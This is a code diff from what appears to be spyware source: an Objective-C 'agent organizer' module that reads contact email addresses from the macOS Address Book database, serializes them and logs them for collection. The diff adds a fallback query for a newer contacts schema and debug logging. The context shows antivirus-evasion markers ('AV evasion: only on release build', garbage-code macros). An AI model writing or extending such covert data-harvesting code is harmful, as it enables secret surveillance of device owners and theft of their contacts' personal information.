@@ -422,47 +422,57 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
 
 - (NSData*)_getMailWithId:(NSInteger)theId usingDb:(sqlite3*)db
 {
-  NSMutableData *mailData = nil;
-  
-  char          sql_query_curr[1024];
-  int           ret, nrow = 0, ncol = 0;
-  char          *szErr;
-  char          **result;
-  char          sql_query_all[] = "select ZADDRESSfrom ZABCDMAILADDRESS";
-  
-  sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all, theId);
-
-  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
-  
-  if (ret != SQLITE_OK)
-    return nil;
-  
-  if (ncol * nrow > 0)
-  {
-    mailData = [NSMutableData dataWithCapacity:0];
+    NSMutableData *mailData = nil;
+ 
+    char          sql_query_curr[1024];
+    int           ret, nrow = 0, ncol = 0;
+    char          *szErr;
+    char          **result;
+    char          sql_query_all[] = "select ZADDRESS from ZABCDMAILADDRESS";
+    char          sql_query_all_new[] = "select ZADDRESS from ZABCDEMAILADDRESS";
     
-    for (int i = 0; i< nrow * ncol; i += 1)
+    sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all, theId);
+
+#ifdef DEBUG_CHAT
+    infoLog(@"query: %s",sql_query_curr);
+#endif 
+    
+    ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+  
+    if (ret != SQLITE_OK)
     {
-      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
-      
-      if (result[ncol + i] != NULL)
-      {
-        NSString *mail     = [NSString stringWithUTF8String: result[ncol + i]];
-        NSData *_mailData  = [mail  dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
-        
-        NSData *serializedPhoneData = [self _serializeSingleRecordData: _mailData
-                                                              withType: Email1Address];
-        
-        [mailData appendData: serializedPhoneData];
-      }
-      
-      [inner release];
+        // maybe it's the new db schema, let's try with the second query
+        memset(sql_query_curr,0,1024);
+        sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all_new, theId);
+        ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+        if (ret != SQLITE_OK)
+            return nil;
     }
+    if (ncol * nrow > 0)
+    {
+        mailData = [NSMutableData dataWithCapacity:0];
     
-    sqlite3_free_table(result);
-  }
+        for (int i = 0; i< nrow * ncol; i += 1)
+        {
+            NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+      
+            if (result[ncol + i] != NULL)
+            {
+                NSString *mail     = [NSString stringWithUTF8String: result[ncol + i]];
+                NSData *_mailData  = [mail  dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+        
+                NSData *serializedPhoneData = [self _serializeSingleRecordData: _mailData
+                                                              withType: Email1Address];
+                [mailData appendData: serializedPhoneData];
+            }
+      
+            [inner release];
+        }
+    
+        sqlite3_free_table(result);
+    }
 
-  return mailData;
+    return mailData;
 }
 
 - (const char*)getDBPath
@@ -492,7 +502,7 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
   AV_GARBAGE_006
   
   additionalHeader->identifier  = 0;
-  additionalHeader->program     = 0x01; // phone contact
+    additionalHeader->program     = 0x11; //new OS X Contacts id //0x01; // phone contact
   additionalHeader->flags       = 0x00000000; // non local (local = 0x80000000)
   
   // AV evasion: only on release build
@@ -600,7 +610,11 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
   }
   
   sqlite3_close(db);
-  
+
+#ifdef DEBUG_CHAT
+    infoLog(@"log AB:%@",logData);
+#endif
+    
   [self _logData: logData];
   
   [self savePk];
